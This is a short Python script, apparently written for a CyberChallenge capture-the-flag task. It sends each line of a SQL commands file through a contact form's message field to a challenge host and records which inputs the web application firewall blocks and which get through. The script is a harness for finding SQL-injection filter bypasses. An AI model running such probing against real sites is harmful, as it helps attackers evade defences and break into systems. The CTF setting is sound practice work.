import requests, os
from typing import Callable

file_path = os.path.dirname(os.path.realpath(__file__))

COMMANDS_FILE = os.path.join(file_path, 'commands.sql')
YEP_FILE = os.path.join(file_path, 'yep.sql')
NOP_FILE = os.path.join(file_path, 'nop.sql')


def intrude(send_request: Callable):
  with open(COMMANDS_FILE, 'r') as file:
    commands = file.read().split('\n')

  with open(NOP_FILE, 'w') as file:
        file.write('')

  with open(YEP_FILE, 'w') as file:
        file.write('')


  for c in commands:

    try:
      error = send_request(c)
    except Exception as e:
      raise(e)
      error = True

    if error:
      with open(NOP_FILE, 'a') as file:
        file.write(c + '\n')
    else:
      with open(YEP_FILE, 'a') as file:
        file.write(c + '\n')

  print('INTRUDED! Check the output files')



if __name__ == '__main__':

  def send_request(value:str):
    url = "http://modinsecurity.challs.cyberchallenge.it:80/"
    data = {"name": "a", "email": "a@gmail.com", "phone": "a", "message": value}
    r = requests.post(url, data=data)
    return ('Your request have been blocked!' in r.text)
  
  intrude(send_request)